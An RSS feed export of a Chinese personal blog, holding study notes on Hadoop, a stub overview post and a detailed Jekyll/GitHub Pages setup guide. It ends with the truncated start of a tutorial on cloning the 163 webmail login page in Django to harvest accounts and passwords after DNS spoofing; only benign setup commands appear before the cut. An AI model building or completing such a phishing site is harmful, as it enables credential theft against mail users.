        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(2)-Hadoop</title>
        <description>&lt;p&gt;&lt;em&gt;简单学习Hadoop相关知识，包括MapReduce计算框架、HDFS文件系统、YARN资源调度与管理系统&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;hadoop&quot;&gt;Hadoop&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mapreduce&quot;&gt;MapReduce&lt;/h3&gt;

&lt;p&gt;大数据计算中最常见的一种计算方式是&lt;strong&gt;批处理&lt;/strong&gt;。2004年Google发表了MapReduce计算范型和框架论文，这是一种构建在大规模PC之上的批处理计算框架，也是一种分布式计算模型，获得了极为广泛的应用。&lt;/p&gt;

&lt;p&gt;MapReduce和传统的并行数据库系统(MPP)相比，更适合&lt;strong&gt;非结构化数据的ETL处理&lt;/strong&gt;(将数据从来源端经过抽取(extract)、转换(transform)、加载(load)至目的端的过程)，且其更具有&lt;strong&gt;扩展性和容错性&lt;/strong&gt;，但单机处理效率低。&lt;/p&gt;

&lt;p&gt;MapReduce计算提供了简洁的编程接口，&lt;strong&gt;输入和输出均是Key/Value键值对&lt;/strong&gt;，只需根据业务逻辑实现Map和Reduce函数即可完成大规模数据的并行批处理任务。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Map函数以Key/Value作为输入，经逻辑计算产生若干仍以Key/Value形式表达的中间数据。计算框架自动将中间数据中具有相同Key值的记录聚在一起，传递给Reduce函数作为输入&lt;/li&gt;
  &lt;li&gt;Reduce函数以Map阶段传递过来的某个Key值及其对应的若干Value值作为输入，对这些Value进行逻辑计算，生成Key/Value即计算结果&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上为MapReduce的简单介绍，更为详细的MapReduce计算模型学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(3)-计算模型/&quot;&gt;大数据学习笔记(3)-计算模型&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;hdfs&quot;&gt;HDFS&lt;/h3&gt;

&lt;p&gt;HDFS的全称是”Hadoop Distributed File System”，是Hadoop中的大规模分布式文件系统。它最初是Yahoo模仿Goole的GFS(Google File System)开发的开源系统，因此在整体架构上和GFS大致相同。与GFS一样，HDFS适合存储&lt;strong&gt;大文件&lt;/strong&gt;并为之提供高吞吐量的&lt;strong&gt;顺序读写&lt;/strong&gt;访问，不太适合大量随机读的应用场景，也不适合储存大量的小文件的应用场景。&lt;/p&gt;

&lt;p&gt;在Hadoop1.x中，HDFS可以被看作简化版的开源GFS系统，因为其在实现时绕开了一些GFS的复杂方案而采用简化方案，因此限制了性能。在这个系列的版本中，存在的问题包括：单点失效和水平扩展不佳。单点失效会导致整个集群不可用，而水平扩展不佳会导致整个文件系统管理文件数目容易达到上限，所以集群规模达到一定程度就无法扩展。&lt;/p&gt;

&lt;p&gt;在Hadoop2.x中，提出了高可用方案(High Availability, HA)和NameNode联盟(NameNode Federation)。其中高可用是为了解决单点失效问题，而NameNode联盟是为了解决整个系统的水平扩展问题。&lt;/p&gt;

&lt;p&gt;以上为HDFS的简单介绍，更为详细的HDFS学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记(4)-分布式文件系统/&quot;&gt;大数据学习笔记(4)-分布式文件系统&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;yarn&quot;&gt;YARN&lt;/h3&gt;

&lt;p&gt;YARN的全称是”Yet Another Resource Negotiator”，是一个独立的&lt;strong&gt;资源调度与管理系统&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;在Hadoop1.x中，所有任务的&lt;strong&gt;资源管理&lt;/strong&gt;以及&lt;strong&gt;生命周期管理&lt;/strong&gt;都由全局唯一的JobTracker负责，造成其功能繁复，限制了系统的可扩展性。同时JobTracker还存在单点失效的问题，一旦JobTracker故障，整个Hadoop集群将崩溃。&lt;/p&gt;

&lt;p&gt;在Hadoop2.x中，将&lt;strong&gt;资源管理&lt;/strong&gt;与&lt;strong&gt;任务生命周期管理&lt;/strong&gt;功能分离，由ResourceManager(RM)负责资源管理，由ApplicationMaster(AM)负责任务所需资源申请管理与任务生命周期管理。这样的好处除了&lt;strong&gt;增强系统的可扩展性&lt;/strong&gt;，&lt;strong&gt;解决JobTracker单点故障问题&lt;/strong&gt;，还&lt;strong&gt;可以部署除MapReduce计算框架外的其他计算框架，共享底层硬件资源&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;以上为YARN的简单介绍，更为详细的YARN学习笔记请参看我的另一篇博文：&lt;a href=&quot;https://wuyinan0126.github.io/2016/大数据学习笔记()-资源调度和管理系统/&quot;&gt;大数据学习笔记()-资源调度和管理系统&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 01 Dec 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(2)-Hadoop/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(2)-Hadoop/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(1)-Overview</title>
        <description>&lt;p&gt;&lt;em&gt;系统学习大数据生态圈中的理论知识和常用工具，并搭建分布式的大数据平台，包括Hadoop、Spark、Hive、Zookeeper、Kafka等常用大数据工具及其涉及的理论知识&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;环境配置&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;*&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;大数据平台架构&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2016-11-16-1.jpeg&quot; alt=&quot;大数据平台架构&quot; title=&quot;大数据平台架构&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;环境变量&lt;/h2&gt;
&lt;hr /&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 16 Nov 2016 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)-Overview/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)-Overview/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; GitHub个人博客搭建</title>
        <description>&lt;p&gt;&lt;em&gt;使用Jekyll-Uno模版在GitHub上搭建个人博客，并添加评论和Google Analytics的功能。包括GitHub相关准备工作、本地开发环境的搭建和其它实用工具&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;github&quot;&gt;GitHub相关准备工作&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;在自己的GitHub仓库中创建名为username.github.io的项目，例如wuyinan0126.github.io&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将你的username.github.io项目（以下称根目录）git clone到本地&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cd $MY_WORKSPACE
 $ git clone https://github.com/username/username.github.io.git
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载Jekyll-Uno模版并解压&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ wget https://github.com/joshgerdes/jekyll-uno/archive/master.zip
 $ unzip jekyll-uno-master.zip
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将解压后的jekyll-uno-master目录中的所有文件复制进根目录&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cp -r ./jekyll-uno-master/* ./username.github.io/
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入根目录，修改配置文件_config.yml，将url和baseurl修改为&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ cd username.github.io
 $ vi ./_config.yml
   -	url: &#39;https://username.github.io&#39;
   -	baseurl: &#39;/&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，提交并上传更新&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ git add .
 $ git commit -a -m &quot;Initial Blog&quot;
 $ git push origin master
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;查看你的GitHub仓库中的username.github.io项目，确认代码上传成功。然后，访问http://username.github.io。Suprise！至此，我们已经将Jekyll-Uno模版展示在我们的个人博客上了！&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;jekyll-server&quot;&gt;使用Jekyll Server进行本地预览&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;安装Ruby和RubyGems，并将Ruby源替换为Ruby淘宝镜像源&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ gem sources --remove https://rubygems.org/ 
 $ gem sources -a https://ruby.taobao.org/ 
 $ gem sources -l  
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，安装Jekyll Server&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ gem install bundler
 $ bundle install
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在根目录，启动Jekyll Server&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ bundle exec jekyll serve --watch
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在&lt;a href=&quot;http://localhost:4000/&quot;&gt;http://localhost:4000/&lt;/a&gt;查看本地预览&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sublime-2omnimarkuppreviewer&quot;&gt;使用Sublime 2和OmniMarkupPreviewer进行博文撰写&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;安装Sublime 2，并在Package Control中输入Install Package，搜索并安装OmniMarkupPreviewer。重启Sublime 2&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入根目录下的_posts目录，这是用于存放博文的地方，新建一个相同命名格式的文件，例如2016-09-15-GitHub个人博客搭建.markdown，并使用&lt;a href=&quot;http://www.appinn.com/markdown/#autoescape&quot;&gt;markdown语法&lt;/a&gt;进行博文撰写&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在Sublime 2的Markdown标签页点击鼠标右键，选择Preview Current Markup in Browser。或者使用快捷键（OSX ⌘+⌥+O; Windows, Linux Ctrl+Alt+O）来实时预览&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对根目录内容进行修改后，提交并上传更新&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ git add .
 $ git commit -a -m &quot;COMMENT&quot;
 $ git push origin master
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;添加评论功能&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;注册&lt;a href=&quot;https://disqus.com/&quot;&gt;Disqus&lt;/a&gt;账户，点击“I want to install Disqus on my site”，并填写基本信息&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;选择平台。选择“install manually with Universal Code”，将获得的代码复制到根目录下的_includes/disqus.html中，Universal Code中需要修改的地方如下&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; var disqus_config = function () {
   this.page.url = &#39;{{ site.url }}{{ page.url }}&#39;; 
   this.page.identifier = &#39;{{ page.id }}&#39;; 
   this.page.title = &#39;{{ page.title }}&#39;;
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; disqus_shortname: &#39;Disqus用户名&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;google-analytics&quot;&gt;添加Google Analytics&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;登录Google Analytics创建新网站，生成跟踪ID&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改根目录下的_config.yml，取消注释&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; google_analytics: &#39;跟踪ID&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-1&quot;&gt;页面布局修改&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;首页添加tag选项&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_includes/header.html:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
  &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
    &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}#blog&quot; title=&quot;link to {{ site.title }} blog&quot; class=&quot;blog-button&quot;&amp;gt;Blog&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;/ul&amp;gt;
  &amp;lt;/nav&amp;gt;

 +++
 &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
 &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
  &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}tags&quot; title=&quot;link to {{ site.title }} tags&quot; class=&quot;blog-button&quot;&amp;gt;Tags&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
 &amp;lt;/ul&amp;gt;
 &amp;lt;/nav&amp;gt;
 +++
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_layouts/tags.html:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;a href=&quot;{{ post.url }}&quot;&amp;gt;{{ post.title }}&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;博文页添加“上一篇”“下一篇”按钮&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下css/main.css，在最后添加:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; .page_navigation {
   font-size: 14px;
   display: block;
   width: auto;
   overflow: hidden;
 }

 .page_navigation a {
   display: block;
   width: 50%;
   float: left;
   margin: 1em 0;
 }

 .page_navigation .next {
   text-align: right;
 }
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下_layouts/post.html，添加：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;section class=&quot;post&quot;&amp;gt;
 {{ content }}
 +++
     &amp;lt;div class=&quot;page_navigation&quot;&amp;gt;
     {% if page.previous %}
       &amp;lt;a class=&quot;prev&quot; href=&quot;{{page.previous.url}}&quot;&amp;gt;&amp;amp;laquo; {{page.previous.title}}&amp;lt;/a&amp;gt;
     {% endif %}
     {% if page.next %}
       &amp;lt;a class=&quot;next&quot; href=&quot;{{page.next.url}}&quot;&amp;gt;{{page.next.title}} &amp;amp;raquo;&amp;lt;/a&amp;gt;
     {% endif %}
     &amp;lt;/div&amp;gt;
 +++
 &amp;lt;/section&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加页面，例如About Me页面&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录下新建me.md，内容如下：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
 layout: me
 title: About Me
 permalink: /me/
 ---
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录的_layouts中新建me.html，内容如下：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
 layout: default
 ---

 &amp;lt;article id=&quot;about-me&quot; class=&quot;post-container post-container--single&quot;&amp;gt;
   &amp;lt;h1 class=&quot;post-title&quot;&amp;gt;About Me&amp;lt;/h1&amp;gt;
   &amp;lt;/header&amp;gt;
   &amp;lt;section class=&quot;post&quot;&amp;gt;
     {% capture about %}{% include me.md %}{% endcapture %}
     {{ about | markdownify }}
   &amp;lt;/section&amp;gt;
 &amp;lt;/article&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录的_includes中新建me.md，内容为你想展示在页面的内容&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录的_includes/header.html，添加按钮：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
   &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
     &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}me&quot; title=&quot;link to {{ site.title }} about me&quot; class=&quot;blog-button&quot;&amp;gt;Me&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
   &amp;lt;/ul&amp;gt;
 &amp;lt;/nav&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;显示表格边界&lt;/p&gt;

    &lt;p&gt;在根目录的css/main.css中添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;style type=&quot;text/css&quot;&amp;gt;
 table{
     border-collapse: collapse;
     border-spacing: 0;
     border: 1px solid #F3F3F3;
 }

 th{
     border: 1px solid #F3F3F3;
     padding: 6px 13px
 }

 td{
     border: 1px solid #F3F3F3;
     padding: 6px 13px
 }
 &amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-2&quot;&gt;其它实用工具&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;使用MathJax引擎在markdown中插入公式&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;在Sublime 2的Package Settings中选择OmniMarkupPreviewer，修改default setting中的&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &quot;mathjax_enabled&quot;: true
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;以启用MathJax引擎&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下的_includes/head.html文件，在&amp;lt;head&amp;gt;标签中添加&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;以在页面渲染时加载MathJax.js&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;测试。在markdown文件中输入&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $$x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}$$
 \\(x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}\\)
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;上面为行间公式，下面为行内公式。使用Sublime 2的OmniMarkupPreviewer或Jekyll Server进行预览&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在markdown中链接本地图片&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;在根目录中新建一个用于存放你的图片的文件夹，例如assets，放入图片，例如test.jpg&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在markdown文件中链接&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ![TITLE](/assets/test.jpg &quot;TITLE&quot;)
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;此适用于Jekyll Server进行预览，不适用于OmniMarkupPreviewer预览&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;语法高亮&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;语法高亮将仅支持Rouge&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ rougify help style
 usage: rougify style [&amp;lt;theme-name&amp;gt;] [&amp;lt;options&amp;gt;]

 Print CSS styles for the given theme.  Extra options are
 passed to the theme.  Theme defaults to thankful_eyes.

 options:
   --scope	(default: .highlight) a css selector to scope by

 available themes:
   base16, base16.dark, base16.monokai, base16.monokai.light, base16.solarized, base16.solarized.dark, colorful, github, molokai, monokai, monokai.sublime, thankful_eyes
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;使用Rouge生成样式&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ rougify style colorful &amp;gt; css/colorful.css
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改css/main.css&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; @import url(colorful.css);
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;使用&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;highlight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;代码&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;endhighlight&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

</description>
        <pubDate>Fri, 08 Jan 2016 23:04:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        
        <category>原创</category>
        
        <category>技术宅</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; Apache2+Django搭建钓鱼网站</title>
        <description>&lt;p&gt;&lt;em&gt;使用Apache2和Django框架搭建163邮箱的钓鱼网站，用于DNS欺骗后将访问163邮箱网站的流量定向到钓鱼网站，并获取邮箱账号和密码&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;django&quot;&gt;安装Django&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;通过pip安装：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ pip install django
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;section&quot;&gt;搭建钓鱼网站&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;用PyCharm生成Django工程，工程名为phisher，在工程根目录创建一个app，app名为mail：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ django-admin.py startapp mail
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在生成的mail目录中创建static和templates文件夹，分别用于存放静态文件(css, js, 图片等)和网页文件(html)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在mail/static和mail/templates中创建163文件夹，用于存放163邮箱网页相关静态文件和网页文件&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-2&quot;&gt;修改网页文件&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
